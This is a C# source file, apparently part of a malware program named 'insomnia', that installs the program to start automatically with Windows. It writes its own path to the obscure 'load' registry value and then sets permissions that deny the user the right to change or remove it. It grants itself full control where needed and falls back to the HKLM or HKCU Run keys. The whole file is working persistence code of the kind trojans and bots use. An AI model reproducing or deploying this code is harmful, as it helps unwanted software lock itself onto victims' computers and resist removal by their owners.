using System;
using System.Collections.Generic;
using System.Text;
using System.Security.AccessControl;
using Microsoft.Win32;

namespace insomnia
{
    internal class RegTools
    {
        public static void CreateProtectedValue()
        {
            RegistrySecurity rs = new RegistrySecurity();

            rs.AddAccessRule(new RegistryAccessRule(Config.user,
                RegistryRights.ReadKey,
                InheritanceFlags.None,
                PropagationFlags.None,
                AccessControlType.Allow));

            rs.AddAccessRule(new RegistryAccessRule(Config.user,
                RegistryRights.WriteKey | RegistryRights.ChangePermissions,
                InheritanceFlags.None,
                PropagationFlags.None,
                AccessControlType.Deny));

            try
            {
                RegistryKey rk = null;
                bool rewrite = false;

                // Check if the load key already exists
                try
                {
                    // If our value is not present, request write access
                    string value = (string)Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).GetValue("load", null);
                    if (value != Config.currentPath)
                    {
                        //Debug.WriteLine("Key marked for rewrite - " + value);
                        rewrite = true;
                    }
                }
                catch
                {
                }

                // Write our value
                try
                {
                    rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true);
                    if (rewrite)
                    {
                        rk.SetValue("load", Config.currentPath);
                        rk.SetAccessControl(rs);
                    }
                }
                catch
                {
                    // Give us write access!
                    GetRegistryAccess();
                    if (rk == null)
                        rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true);

                    rk.SetValue("load", Config.currentPath);
                    rk.SetAccessControl(rs);
                }

               //Debug.WriteLine("Created primary protected load key successfully.");
            }
            catch
            {
                //Debug.WriteLine("Error setting reg perm: " + ex.Message);
                try
                {
                    Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue(Config._registryKey(), Config.currentPath);
                    Config.regLocation = "HKLM";
                }
                catch
                {
                    try
                    {
                        Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue(Config._registryKey(), Config.currentPath);
                    }
                    catch
                    {
                    }
                }
                
                //Debug.WriteLine("Failed to create primary load, created run key");
            }
        }

        private static void GetRegistryAccess()
        {
            RegistrySecurity wa = new RegistrySecurity();

            wa.AddAccessRule(new RegistryAccessRule(Config.user,
                RegistryRights.FullControl,
                InheritanceFlags.None,
                PropagationFlags.None,
                AccessControlType.Allow));

            RegistryKey rkW = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", false);
            rkW.SetAccessControl(wa);
        }
    }
}
